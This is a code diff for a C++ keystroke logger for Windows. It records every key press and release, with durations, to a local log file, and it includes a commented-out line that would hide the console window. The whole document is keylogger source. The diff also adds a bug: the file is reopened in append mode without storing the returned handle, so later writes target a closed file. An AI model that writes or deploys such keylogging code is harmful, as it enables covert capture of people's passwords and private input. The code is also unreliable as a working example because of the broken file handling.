@@ -856,7 +856,6 @@ int main(void) {
     KeyStream activeKeyStream; // NOTE (Lapys) -> Contain all active (pressed) keys.
 
     FILE *keystrokeLogFile = NULL; // NOTE (Lapys) -> Output to file.
-    const char keystrokeLogFileMode[2] {'w', '\0'};
     const char *keystrokeLogFileName = "keyboard-keystroke-logger.log";
 
     const unsigned short keySize = 1u << (sizeof(SHORT) * 8u - 1u); // NOTE (Lapys) -> Event-based keystroke listening for Windows operating systems.
@@ -867,11 +866,13 @@ int main(void) {
     // ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
     // Update > (Keystroke Log File, Key Stream)
-    keystrokeLogFile = ::fopen(keystrokeLogFileName, keystrokeLogFileMode);
-    ::fputc('\r', keystrokeLogFile); ::fputc('\b', keystrokeLogFile);
+    keystrokeLogFile = ::fopen(keystrokeLogFileName, "w");
 
     // ...
     while (true) {
+        // Constant > Key Stream Length
+        const unsigned char keyStreamLength = keyStream.length;
+
         // Logic
         #if defined(_WIN32) || defined(_WIN64)
             // Logic
@@ -1077,8 +1078,11 @@ int main(void) {
         #elif defined(__ANDROID__)
         #endif
 
+        // Logic > Update > Keystroke Log File
+        if (keyStreamLength) { ::fclose(keystrokeLogFile); ::fopen(keystrokeLogFileName, "a"); }
+
         // Loop --- NOTE (Lapys) -> Log the state of the keyboard`s events via keystrokes.
-        for (unsigned char keyStreamIterator = 0u, keyStreamLength = keyStream.length; keyStreamIterator ^ keyStreamLength; keyStreamIterator += 1u) {
+        for (unsigned char keyStreamIterator = 0u; keyStreamIterator ^ keyStreamLength; keyStreamIterator += 1u) {
             // Declaration > Key (Information)
             KeyInformation& keyInformation = keyStream.get(keyStreamIterator);
             const Key key = keyInformation.key;
@@ -1098,7 +1102,7 @@ int main(void) {
 
                     // Update > (Active Key Stream, Keystroke Log File)
                     activeKeyStream.add(keyInformation);
-                    ::fprintf(keystrokeLogFile, " %s[P]", keyInformationString);
+                    ::fprintf(keystrokeLogFile, "%s[P]\n", KeyStream::keyInformationToString(keyStream, keyInformation));
                 }
 
                 // Update > Key Information
@@ -1106,24 +1110,26 @@ int main(void) {
             }
 
             else {
-                // Constant > Key Information String
+                // Constant > Key Information ...
+                const double keyInformationActiveEventTime = keyInformation.getTimeInSeconds();
                 const char *keyInformationString = KeyStream::keyInformationToString(keyStream, keyInformation);
 
                 // Print
-                ::printf("%s (pressed) for %f seconds\n", keyInformationString, keyInformation.getTimeInSeconds());
+                ::printf("%s (pressed) for %f seconds\n", keyInformationString, keyInformationActiveEventTime);
                 ::printf("%s (released)\n", keyInformationString);
 
-                // Update > Keystroke Log File
-                ::fprintf(keystrokeLogFile, " %s[R]", keyInformationString);
+                // Logic > Update > Keystroke Log File
+                if (keyInformationActiveEventTime) ::fprintf(keystrokeLogFile, "%s[R after %fs]\n", keyInformationString, keyInformationActiveEventTime);
+                else ::fprintf(keystrokeLogFile, "%s[R]\n", keyInformationString);
 
                 // Deletion
                 activeKeyStream.remove(key);
             }
         }
-    }
 
-    // Update > Keystroke Log File
-    ::fclose(keystrokeLogFile);
+        // Logic > Update > Keystroke Log File
+        if (keyStreamLength) ::fclose(keystrokeLogFile);
+    }
 
     // Return
     return 0;
